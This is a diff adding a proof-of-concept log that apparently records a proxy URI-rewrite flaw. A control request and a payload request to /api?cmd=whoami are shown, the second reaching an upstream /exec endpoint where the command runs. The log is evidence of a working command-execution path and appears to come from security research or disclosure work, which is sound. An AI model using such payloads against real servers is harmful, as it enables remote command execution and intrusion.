@@ -1,0 +1,11 @@
+# headline PoC  lane B  build=3aeb255d3d7f__29d05850
+# location /api { proxy_pass http://backend/exec; } ; emitted target = uri + path.substr(min(len,4)) + query
+# control first (same server, same config), then the single zero-percent request
+CONTROL GET /hello.txt -> 200  (body b'ALPHA\n')
+PAYLOAD GET /api?cmd=whoami  (no percent byte in the target)
+client status 200
+UPSTREAM token-count 3
+UPSTREAM verbatim line: 'GET /exec?cmd=whoami HTTP/1.1'
+UPSTREAM peer verdict: TOKENS:3 TARGET:/exec?cmd=whoami EXEC[whoami]:mouse9911
+VERDICT: executed (3 whitespace tokens, target path token /exec, command ran)
+controlled-diff: control line vs payload line differ
